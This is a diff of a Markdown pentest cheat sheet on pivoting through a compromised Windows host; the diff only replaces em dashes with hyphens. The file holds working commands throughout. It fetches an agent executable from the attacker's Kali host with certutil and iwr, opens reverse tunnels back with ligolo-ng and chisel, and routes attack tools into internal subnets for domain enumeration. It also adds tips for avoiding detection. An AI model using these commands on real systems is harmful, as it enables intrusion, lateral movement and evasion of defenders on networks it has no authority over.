@@ -4,7 +4,7 @@
 
 ## Ligolo-ng (Best Option)
 
-Creates a real TUN interface on Kali — tools run natively without proxychains overhead.
+Creates a real TUN interface on Kali - tools run natively without proxychains overhead.
 
 ### Architecture
 ```
@@ -12,7 +12,7 @@ Kali (attacker) <── TLS tunnel ──> Compromised Host (agent) ──> Inte
   [ligolo proxy]                   [ligolo agent]
 ```
 
-### Step 1 — Setup on Kali
+### Step 1 - Setup on Kali
 ```bash
 # Create TUN interface (once)
 sudo ip tuntap add user $USER mode tun ligolo
@@ -25,9 +25,9 @@ sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:443
 ```
 
-### Step 2 — Transfer Agent to Windows Target
+### Step 2 - Transfer Agent to Windows Target
 ```powershell
-# From Kali — serve it
+# From Kali - serve it
 python3 -m http.server 8080
 
 # On Windows target
@@ -36,13 +36,13 @@ certutil -urlcache -split -f http://<KALI-IP>:8080/ligolo-ng_agent_windows_amd64
 iwr -uri http://<KALI-IP>:8080/agent.exe -OutFile agent.exe
 ```
 
-### Step 3 — Agent Connects Back
+### Step 3 - Agent Connects Back
 ```powershell
 # On Windows target
 .\agent.exe -connect <KALI-IP>:11601 -ignore-cert
 ```
 
-### Step 4 — Start Tunnel on Kali
+### Step 4 - Start Tunnel on Kali
 In the ligolo console:
 ```
 >> session         # Select your session
@@ -56,7 +56,7 @@ sudo ip route add 192.168.1.0/24 dev ligolo
 sudo ip route add 10.10.0.0/24 dev ligolo
 ```
 
-### Step 5 — Use Tools Natively
+### Step 5 - Use Tools Natively
 ```bash
 netexec smb 192.168.1.0/24 -u user -p pass
 nmap -sV 192.168.1.10
@@ -68,10 +68,10 @@ bloodhound-python -d domain.local -u user -p pass -dc dc01.domain.local
 ## Chisel (Alternative if Ligolo Gets Flagged)
 
 ```bash
-# Kali — server
+# Kali - server
 ./chisel server -p 8000 --reverse
 
-# Windows target — connect back with SOCKS5
+# Windows target - connect back with SOCKS5
 .\chisel.exe client <KALI-IP>:8000 R:socks
 
 # Edit proxychains config
@@ -103,7 +103,7 @@ netexec smb dc01.domain.local -u user -p pass --users
 # LDAP is much quieter than SMB spraying
 ldapdomaindump -u 'domain\user' -p 'pass' ldap://dc01.domain.local
 
-# BloodHound — avoid session enum
+# BloodHound - avoid session enum
 bloodhound-python -c DCOnly -d domain.local -u user -p pass
 ```
 
